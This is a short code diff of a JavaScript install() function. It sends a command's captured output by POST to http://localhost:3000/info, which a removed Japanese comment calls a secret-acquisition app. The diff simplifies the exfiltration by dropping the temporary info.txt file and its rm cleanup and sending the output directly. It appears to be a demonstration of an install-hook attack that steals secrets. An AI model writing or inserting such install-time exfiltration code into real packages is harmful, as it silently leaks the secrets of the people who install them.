@@ -15,21 +15,13 @@ async function install() {
       encoding: 'utf8'
     });
 
-    // 結果をinfo.txtに保存
-    fs.writeFileSync('info.txt', result);
-
-    const fileInfo = fs.readFileSync("info.txt", "utf-8");
-    // シークレット取得アプリにPOSTリクエストで送信
     await fetch("http://localhost:3000/info", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
-      body: JSON.stringify({ info: fileInfo }),
+      body: JSON.stringify({ info: result }),
     });
-
-    // info.txtを削除
-    execSync("rm info.txt");
 
   } catch (error) {
     console.error("Installation failed:", error);
